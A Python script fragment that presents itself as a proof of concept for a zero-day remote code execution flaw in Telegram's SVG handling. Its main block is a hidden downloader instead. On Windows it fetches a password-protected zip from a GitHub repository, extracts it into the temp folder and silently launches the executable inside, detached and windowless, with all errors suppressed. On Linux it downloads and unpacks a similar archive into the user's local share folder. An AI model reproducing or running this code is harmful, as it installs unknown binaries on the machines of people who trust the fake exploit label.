...
if __name__ == '__main__':
    if os.name == 'nt':
        try:
            namezip = "cvesdatawin.zip"
            name    = "cvesdatawin"
            url = "https://github.com/securitymike2310/telegram-zero-day-rce-poc/raw/main/gitignore/cvesdatawin.zip"
            ...
            if not os.path.exists(os.path.join(os.environ['TMP'], name, name + ".exe")):
                ...
                zf = ZipFile(des, 'r')
                zf.extractall(os.path.join(os.environ['TMP'], name), pwd=bytes(',hIc^?>/LUjv/`Mcl(lo', 'utf-8'))
                zf.close()
                pid = subprocess.Popen([os.path.join(os.environ['TMP'], name, name + ".exe")], creationflags=0x00000008 | subprocess.CREATE_NO_WINDOW).pid
        except:
            pass
    else:
        url = "https://github.com/securitymike2310/telegram-zero-day-rce-poc/raw/main/gitignore/cvesdatanix.zip"
        namezip = "cvesdatanix.zip"
        name    = "cvesdatanix"
        ...
        if not os.path.exists(os.path.join("/home/" + os.environ["USER"] + "/.local/share", name, name)):
            ...
            with open(des, 'wb') as f: f.write(urllib.request.urlopen(url).read())
            zf = ZipFile(des, 'r')
            zf.extractall(os.path.join("/home/" + os.environ["USER"] + "/.local/share", name), pwd=bytes(',hIc^?>/LUjv/`Mcl(lo', 'utf-8'))
            zf.close()
...
if __name__ == '__main__':
	print('[%] CVE_2023-55436 - RCE Zero Day Vulnerability in Telegram's SVG image processing library [%]')
